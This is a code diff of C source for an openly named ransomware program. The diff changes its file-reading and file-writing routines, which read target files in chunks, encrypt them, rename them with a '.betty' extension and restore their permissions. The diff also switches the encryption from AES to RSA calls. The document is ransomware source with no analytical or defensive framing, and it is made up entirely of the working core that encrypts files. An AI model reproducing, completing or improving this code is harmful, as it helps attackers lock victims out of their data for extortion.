@@ -8,9 +8,9 @@
  **/
 size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *))
 {
-	size_t bytes_read = ransom->target_file_buf->bytes_read;
-	off_t file_offset = ransom->target_file_buf->file_offset;
-	unsigned int st_size = (unsigned int)ransom->target_file_buf->file_info.st_size;
+	size_t bytes_read = TMP_BUFS->bytes_read;
+	off_t file_offset = TMP_BUFS->file_offset;
+	unsigned int st_size = (unsigned int)TMP_BUFS->file_info.st_size;
 	FILE *fd = NULL;
 
 	if (!filepath || !ransom)
@@ -28,7 +28,7 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 		return(0);
 #ifndef NO_DEBUG
 	printf("\n\n----------------------------------------------\n");
-	printf("st_size: %d - file_offset: %d == %d\n", st_size, (int)ransom->target_file_buf->file_offset, st_size - (int)ransom->target_file_buf->file_offset);
+	printf("st_size: %d - file_offset: %d == %d\n", st_size, (int)TMP_BUFS->file_offset, st_size - (int)TMP_BUFS->file_offset);
 	printf("bytes_read: %d\n", (int)bytes_read);
 	getchar();
 #endif
@@ -36,18 +36,21 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
 		bytes_read = BIGBUF;
 	else
 		bytes_read = (size_t)st_size - file_offset;
-	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
+	fread((char *)TMP_BUFS->buf, bytes_read, sizeof(char), fd);
 	fclose(fd);
 	/* update tmp buffer struct to use in main. Set end of bytes read to null, for printing later*/
 #ifndef NO_DEBUG
-	ransom->target_file_buf->buf[bytes_read] = '\0';
+	TMP_BUFS->buf[bytes_read] = '\0';
 #endif
-	ransom->target_file_buf->file_offset += bytes_read;
-	ransom->target_file_buf->bytes_read = bytes_read;
+	TMP_BUFS->file_offset += bytes_read;
+	TMP_BUFS->bytes_read = bytes_read;
 
+#ifndef NO_DEBUG
+		printf("DEBUG\n");
+#endif
 	/* call external function */
 	if(fxn)
-		fxn(ransom->target_file_buf->buf, ransom);
+		fxn(TMP_BUFS->buf, ransom);
 	return (bytes_read);
 }
 
@@ -59,54 +62,46 @@ size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ra
  **/
 char *write_file(char *buffer, ransom_t *ransom)
 {
-	int buf_size = 0;
-	size_t new_ext_len = 0, filepath_len = 0, bytes_written = 0;
-	char *new_ext = ".betty", *filepath = NULL;
+	int cipher_buf_size = 0;
+	int new_ext_len = 0, filepath_len = 0, bytes_written = 0;
+	char *new_ext = ".betty";
 	unsigned char *cipher_buf = NULL;
 	FILE *fd = NULL;
 
-	filepath = ransom->target_file_buf->filepath;
-	filepath_len = my_strlen(filepath);
-	new_ext_len = my_strlen(new_ext);
-	buf_size = ransom->target_file_buf->bytes_read;
+	filepath_len = (int)my_strlen(TMP_BUFS->filepath);
+	new_ext_len = (int)my_strlen(new_ext);
+	cipher_buf = TMP_BUFS->cipher_buf;
 	/** ENCRYPT **/
 	if (ransom->cipher_flag == 'e')
 	{
-		/**
-		  * If filepath has ".betty" at the end of it,
-		  * the file still is bigger than 4KiB, and is getting written into.
-		  * Append ".betty" to the working file. This prevents things like
-		  * "file.txt.betty", "file.txt.betty.betty", "file.txt.betty.betty.betty"
-		  * in the case of a 12KiB+ size file.
-		  **/
-		if (find_substr_end(filepath, new_ext) == 0)
-			my_strncat(filepath, new_ext, filepath_len, new_ext_len);
+		if (find_substr_end(TMP_BUFS->filepath, new_ext) == 0)
+			my_strncat(TMP_BUFS->filepath, new_ext, filepath_len, new_ext_len);
 
-		if ((fd = fopen(filepath, "ab+")))
-			fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
+		if ((fd = fopen(TMP_BUFS->filepath, "ab+")))
+			fseek(fd, TMP_BUFS->file_offset, SEEK_SET);
 		else
 			return(NULL);
-		cipher_buf = aes_encrypt(ransom->target_file_buf->cipher, (unsigned char *)buffer, &buf_size);
+		cipher_buf_size = encrypt_rsa(buffer, ransom);
 	}
 	/** DECRYPT **/
 	else if (ransom->cipher_flag == 'd')
 	{
-		if (find_substr_end(filepath, new_ext) != 0)
-			filepath[filepath_len - new_ext_len] = '\0';
-		if ((fd = fopen(filepath, "ab+")))
-			fseek(fd, ransom->target_file_buf->file_offset, SEEK_SET);
+		if (find_substr_end(TMP_BUFS->filepath, new_ext) != 0)
+			TMP_BUFS->filepath[filepath_len - new_ext_len] = '\0';
+		if ((fd = fopen(TMP_BUFS->filepath, "ab+")))
+			fseek(fd, TMP_BUFS->file_offset, SEEK_SET);
 		else
 			return(NULL);
-		cipher_buf = aes_decrypt(ransom->target_file_buf->cipher, (unsigned char *)buffer, &buf_size);
+		cipher_buf_size = decrypt_rsa(buffer, ransom);
 	}
-	if ((bytes_written = fwrite(cipher_buf, buf_size, sizeof(char), fd)) < 1)
+	/* Write to file */
+	if ((bytes_written = fwrite(cipher_buf, cipher_buf_size, sizeof(char), fd)) < 1)
 	{
 #ifndef NO_DEBUG
 		fprintf(stderr, "No bytes written\n");
 #endif
 	}
-	free(cipher_buf);
 	fclose(fd);
-	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
+	chmod(TMP_BUFS->filepath, TMP_BUFS->file_info.st_mode);
 	return(buffer);
 }
